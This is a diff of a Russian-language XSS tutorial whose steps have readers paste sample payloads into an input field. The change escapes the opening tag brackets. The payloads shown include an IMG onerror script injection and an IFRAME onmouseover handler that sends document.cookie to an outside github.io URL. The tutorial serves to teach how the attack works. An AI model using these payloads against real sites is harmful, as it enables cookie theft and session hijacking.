@@ -20,7 +20,7 @@ XSS ( Cross-Site Scripting — «межсайтовый скриптинг» ) �
 1. Скопируйте код ниже и вставьте его в поле ввода элемента ~input~:
 
 ~~~html
-<IMG SRC="images/hack.png"
+&lt;IMG SRC="images/hack.png"
      onerror="document.write ( String.fromCharCode ( 88, 83, 83) )"/>
 ~~~
 
@@ -29,7 +29,7 @@ XSS ( Cross-Site Scripting — «межсайтовый скриптинг» ) �
 2. Скопируйте код ниже и вставьте его в поле ввода элемента ~input~:
 
 ~~~html
-<IFRAME SRC=js/attack.html
+&lt;IFRAME SRC=js/attack.html
         onmouseover="window.open ( 'https://garevna.github.io/js-samples/js/attack.html#' + document.cookie, '_self' )">
 </IFRAME>
 ~~~
